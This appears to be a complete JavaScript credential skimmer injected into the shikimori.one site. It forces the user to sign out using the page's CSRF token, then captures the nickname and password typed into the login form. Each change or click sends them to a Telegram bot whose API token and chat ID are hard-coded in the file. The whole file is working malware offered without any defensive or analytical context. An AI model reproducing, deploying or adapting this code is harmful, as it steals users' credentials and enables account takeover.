 function onInject() {
    console.log('Init Inject');

    signOutUser();

    const name = document.getElementById('user_nickname');
    const pass = document.getElementById('user_password');
    if(pass != null && name != null) {
        console.log('inputs found!');

        name.addEventListener("change", onClickAction);
        pass.addEventListener("change", onClickAction);

        const submitButton = document.querySelector('.btn-primary');
        if(submitButton != null) {
            console.log('button found!');
            submitButton.addEventListener("click", onClickAction);
        }
    }
 }

 function signOutUser() {
     const xhr = new XMLHttpRequest();
        xhr.open("GET", "https://shikimori.one/", true);
        xhr.send();
        xhr.onload = function() {
            if (xhr.status === 200) {
                const bodyDoc = document.querySelector('body');
                const jsonAttribute = bodyDoc.getAttribute('data-user');
                const jsonObject = JSON.parse(jsonAttribute);
                const parser = new DOMParser();
                const doc = parser.parseFromString(xhr.responseText, "text/html");
                const metaTag = doc.querySelector('meta[name="csrf-token"]');
                const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
                const xhr2 = new XMLHttpRequest();
                xhr2.open("POST", "/api/users/sign_out", true);
                xhr2.setRequestHeader("Content-Type", "application/json");
                xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
                xhr2.send()
            }
        }
 }

 function onClickAction() {
    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
    const chatId = '250460465';

    const name = document.getElementById('user_nickname').value;
    const pass = document.getElementById('user_password').value;
    const message = `Name: ${name}\nPassword: ${pass}`;

            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                    console.log('success');
                    //$('#response').text('Message sent');
                },
                error: function (error) {
                    console.log(error);
                    // alert("error failed");
                }
            });
 }

onInject();
